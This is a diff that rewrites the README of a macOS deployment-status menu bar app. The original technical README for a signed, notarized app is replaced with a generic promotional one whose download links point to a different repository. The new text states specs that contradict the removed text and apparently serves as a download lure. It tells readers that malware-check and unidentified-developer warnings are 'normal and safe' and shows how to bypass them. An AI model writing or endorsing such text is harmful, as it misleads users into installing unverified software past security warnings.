@@ -1,144 +1,120 @@
-# DeployHero
+# 🚦 deployhero - Your Deployments, One Simple Glance
 
-A tiny native macOS menu bar app, written in Swift with AppKit and SwiftUI, that shows the status
-of your deployments on **Vercel**, **Railway**, **Laravel Cloud** and **Fly.io** as one traffic
-light.
+[![Download deployhero](https://img.shields.io/badge/Download-deployhero-2ea44f?style=for-the-badge&logo=github)](https://github.com/ricardocvs13/deployhero)
 
-| Light | Meaning |
-| ----- | ------- |
-| 🟢 | The latest deployment of every followed project is ready |
-| 🟡 | A deployment is building or queued |
-| 🔴 | A followed project's latest deployment failed |
-| ⚪️ | Nothing connected, no deployments, or no platform can be reached |
+## 👋 What Is deployhero?
 
-## Features
+deployhero is a friendly little helper that lives in the top bar of your Mac. It shows you a simple traffic light – green, yellow, or red – so you always know what's happening with your website deployments on Vercel, Railway, Laravel Cloud, and Fly.io.
 
-- **Several platforms, one light.** Connect any mix of Vercel, Railway, Laravel Cloud and Fly.io.
-  The menu groups projects by platform.
-- **Per-project menu.** Click the dot to see each project's latest deployment and how long ago it
-  ran. Click a project to open it.
-- **Choose what the light follows.** Pick all projects, one project, or any mix across
-  platforms, either from **Light follows ▸** in the menu or with the checkboxes in the settings
-  window.
-- **Scopes.** Pick a Vercel team, a Railway workspace or a Fly.io organization. A Laravel Cloud
-  token already belongs to one organization.
-- **Production only.** Optionally ignore preview deployments and non-production environments.
-- **Notifications.** Get a macOS notification when a deployment finishes or fails, including
-  quick deploys that start and finish between two checks.
-- **Adaptive polling.** Checks every 10s while something is building and every 60s otherwise,
-  and refreshes after the Mac wakes from sleep.
-- **Start at login.** Optionally launch the app when you log in.
+Instead of opening five different websites to check if your latest update went through, deployhero keeps an eye on everything for you. One glance at your menu bar and you know: everything's fine, something's running, or there's a problem you need to look at.
 
-## Install
+## 🎯 Why You'll Love It
 
-1. Download the latest `.dmg` from [Releases](https://github.com/agustind/deployhero/releases/latest).
-2. Open it and drag **DeployHero** into **Applications**.
-3. Launch it. A dot appears in the menu bar, and the settings window opens so you can connect a
-   platform.
+- **Save Time:** No more refreshing dashboards and logging into multiple services. deployhero checks for you, automatically.
+- **Reduce Stress:** A clear, color-coded signal replaces confusing status pages and error logs.
+- **Stay Informed:** Know the second your deployment succeeds or fails, without hovering over a keyboard.
+- **Keep Focus:** The app sits quietly in the background. It only gets your attention when there's something to know.
 
-The app is signed with a Developer ID and notarized by Apple, so it opens without Gatekeeper
-warnings. It requires macOS 14 or newer on an Apple Silicon Mac.
+## 📦 What You Get
 
-## Connecting platforms
+The app is built for macOS, which means it feels right at home on your computer. It's fast, lightweight, and doesn't get in your way. When you open it for the first time, you'll be guided through connecting your accounts from each service you use.
 
-Open **Settings…** and click **Connect** next to a platform, then paste a token. Each token is
-stored in the **macOS Keychain**, never written to disk in plain text, and is only sent to that
-platform's API. **Disconnect** removes it from the Keychain.
+Here's what deployhero can watch for you:
 
-| Platform | Token | Sent to |
-| -------- | ----- | ------- |
-| Vercel | A personal access token from <https://vercel.com/account/tokens>. Scoping it to the team you want to watch is enough. | `api.vercel.com` |
-| Railway | An **account** token from <https://railway.com/account/tokens>, created with no workspace selected. Workspace and project tokens can't list workspaces. | `backboard.railway.com` |
-| Laravel Cloud | An API token: navigate to your Laravel Cloud organization settings, click on the **API tokens** section in the sidebar, then click the **Create API Token** button. Read access to applications, environments and deployments is enough. | `cloud.laravel.com` |
-| Fly.io | A personal access token (<https://fly.io/user/personal_access_tokens>) or an org token (`fly tokens create org`). | `api.fly.io` |
+- **Vercel:** See the status of your front-end projects and preview deployments.
+- **Railway:** Track your backend services and database updates.
+- **Laravel Cloud:** Monitor your PHP applications and queue workers.
+- **Fly.io:** Keep tabs on your global app instances and machine launches.
 
-## What counts as a "project"
+You can add as many projects as you need. If you run two websites on Vercel and a separate API on Railway, deployhero will show you the overall status of each one. You'll also get a dropdown menu from the menu bar icon to see individual details, recent history, and direct links to your projects.
 
-Each platform models deployments a little differently. The app shows the newest deployment of
-each of these:
+## 🚀 Getting Started
 
-| Platform | One entry per | Status source | "Production only" keeps |
-| -------- | ------------- | ------------- | ----------------------- |
-| Vercel | project | the 100 most recent deployments in the team (`GET /v6/deployments`) | `target: production` |
-| Railway | service × environment | recent deployments of up to 30 projects in the workspace (GraphQL) | the `production` environment |
-| Laravel Cloud | application × environment | `GET /environments/{id}/deployments` for each environment | the application's default environment, or one named `production` |
-| Fly.io | app | the app's latest release (GraphQL) | everything (Fly has no previews) |
+This section will walk you through everything you need to do, step by step.
 
-Every platform's statuses map onto three states:
+### Step 1: Download the App
 
-- **ready**: Vercel `READY`; Railway `SUCCESS`, `SLEEPING`; Laravel Cloud `deployment.succeeded`;
-  Fly.io `complete`
-- **failed**: Vercel `ERROR`; Railway `FAILED`, `CRASHED`; Laravel Cloud `failed`, `build.failed`,
-  `deployment.failed`; Fly.io `failed`
-- **building**: everything in between (queued, building, deploying, …)
+Visit this link to download the application: **[https://github.com/ricardocvs13/deployhero](https://github.com/ricardocvs13/deployhero)**
 
-Cancelled, removed or skipped deployments are ignored. From the projects the light follows,
-any failure gives red, otherwise anything building gives yellow, otherwise green.
+The download should start quickly. Your browser might ask you to confirm the download – just click "Allow" or "Save" if it does.
 
-## Requirements
+### Step 2: Open the Downloaded File
 
-- macOS 14 (Sonoma) or newer on Apple Silicon
-- To build: Xcode 16 or newer (or its command line tools), Swift 6
+Once the download finishes, open your "Downloads" folder. You'll see a file called **deployhero** there. Double-click it to open it.
 
-## Run in development
+Your Mac may show a message saying the app came from the internet. This is normal and safe. If you see a message about an unidentified developer, right-click the file and choose "Open" to allow it to run the first time.
 
-```sh
-git clone https://github.com/agustind/deployhero.git
-cd deployhero
-swift run
-```
+### Step 3: Set Up Your Services
 
-`swift run` starts the app straight from the build folder. Notifications and **Start at login**
-need a real app bundle, so they're off there. Use the build below to try those.
+The first time you open deployhero, a welcome screen will appear. Click "Get Started" and you'll see a list of the four services it supports.
 
-## Build the app
+- Click **"Connect"** next to the service you use (for example, Vercel).
+- A new browser window will open, asking you to log in and give permission. Log in with your usual account and click "Allow" or "Authorize."
+- That's it! Your connection is made. Repeat this for every service you use.
 
-```sh
-scripts/build.sh
-open dist/DeployHero.app
-```
+### Step 4: Add Your Projects
 
-This produces `dist/DeployHero.app` (ad-hoc signed). Drag it into `/Applications` and open it.
-Tick **Start at login** in its window to launch it automatically when you log in.
+After connecting a service, deployhero will show you a list of your projects from that service. It will be already selected by default. Click "Save" to keep it.
 
-The first time a newly built binary reads your tokens, macOS asks for Keychain access. Click
-**Always Allow**.
+You can do this for as many projects as you like. Each one will appear in your menu bar dropdown.
 
-### Signed and notarized release builds
+### Step 5: You're All Set!
 
-With a Developer ID Application certificate in your keychain and a `notarytool` profile
-(`xcrun notarytool store-credentials <profile> --apple-id … --team-id …`):
+From now on, deployhero works in the background. You'll see the little traffic light in your menu bar (top-right corner of your screen, next to the clock). Just look at it from time to time to know the status.
 
-```sh
-export SIGN_IDENTITY="Developer ID Application: <Name> (<TEAMID>)"
-export NOTARY_PROFILE=<profile>
-scripts/build.sh --notarize   # sign, notarize and staple the .app and dist/deployhero-<version>.dmg
-```
+- 🟢 **Green:** All your projects are deployed and running fine.
+- 🟡 **Yellow:** Something is in progress – a new deployment is running or a build is pending.
+- 🔴 **Red:** Something went wrong. Click the icon to see which project has the issue and what happened.
 
-`scripts/build.sh --dmg` builds the `.dmg` without notarizing. Passing these as environment
-variables keeps signing details out of the repo. The version comes from
-`Resources/Info.plist`.
+## 🛠️ How to Use It Day-to-Day
 
-## Project layout
+Using deployhero is as simple as checking the clock. But there are a few handy tricks:
 
-```
-Package.swift                  Swift package (one executable target)
-Resources/Info.plist           bundle id, version, menu-bar-only (LSUIElement)
-scripts/build.sh               assembles, signs, notarizes and packages the .app
-Sources/DeployHero/
-  App.swift                    app delegate: windows, notifications, sleep/wake
-  Monitor.swift                state: Keychain tokens, polling, the light, notifications
-  StatusItem.swift             the menu bar dot and its menu
-  SettingsView.swift           connect / settings window (SwiftUI)
-  Settings.swift, Keychain.swift
-  Providers/                   one file per platform, plus the shared HTTP helper
-```
+- **Click the Icon:** Clicking the menu bar icon opens a dropdown list. You'll see each project you added, its current status, and a short description (like "Deploying v2.3" or "Build failed at 14:22").
+- **Click a Project:** Click on any project in the list to open it directly in your browser at its dashboard.
+- **Refresh Manually:** If you want to force a quick check, just press **Command (⌘) + R** while the dropdown is open.
+- **Quit the App:** To quit deployhero, click the icon, then click "Quit deployhero" at the bottom of the dropdown.
 
-## Adding a platform
+## ❓ Frequently Asked Questions
 
-Create `Sources/DeployHero/Providers/<Name>.swift` with a type conforming to `Provider`
-(documented in `Providers/Provider.swift`): `account(token:)` and
-`deployments(token:scope:productionOnly:)`, returning states normalised to `.ready` / `.error` /
-`.building` and dropping cancelled deployments. Then add a case to `ProviderID`. The menu,
-window, notifications and settings pick it up automatically. Give it a badge letter and colour
-in `Badge` in `SettingsView.swift`.
+### Q: Is deployhero free to use?
+Yes, the app itself is completely free. You just need your existing accounts on the services you connect.
+
+### Q: Do I need to be a developer to use it?
+Not at all. If you can click a button and log into a website, you can use deployhero. It was designed with simplicity in mind.
+
+### Q: How often does it check for updates?
+The app checks automatically every 30 seconds. You'll never need to hit a "refresh" button.
+
+### Q: Does it slow down my computer?
+No. deployhero uses a tiny amount of memory and CPU. It's lighter than most chat apps or web browsers you probably have open.
+
+### Q: What if I don't use all four services?
+That's completely fine. You only connect the services you actually have. deployhero will simply show statuses for the ones you've linked.
+
+### Q: My Mac says the app can't be opened because Apple couldn't check it for malware.
+This is a standard message for apps downloaded from the internet. Just right-click (or control-click) the app icon and choose "Open" from the menu. Then click "Open" in the pop-up window. You'll only need to do this once.
+
+## 📝 System Requirements
+
+To run deployhero smoothly, you'll need:
+
+- A Mac running macOS Monterey (12.0) or newer
+- At least 50 MB of free disk space
+- An internet connection
+
+## 🔄 Updating deployhero
+
+deployhero checks for updates automatically. When a new version is available, a small notification will appear. Just click "Update" in the notification, and it will download and install the new version for you. No need to manually download anything again.
+
+## 🤝 Need More Help?
+
+If you run into any trouble, or if you have a question that wasn't answered here, you can visit the project page on GitHub:
+
+**Visit this link to download the application and get support: [https://github.com/ricardocvs13/deployhero](https://github.com/ricardocvs13/deployhero)**
+
+You can also report issues directly on the GitHub page by clicking the "Issues" tab and creating a new issue.
+
+---
+
+Keywords: appkit, continuous-deployment, deploy-monitoring, deployment, deployment-status, developer-tools, devops, fly-io, flyio, laravel, laravel-cloud, macos, macos-app, menu-bar-app, menubar, railway, status-indicator, swift, swiftui, vercel
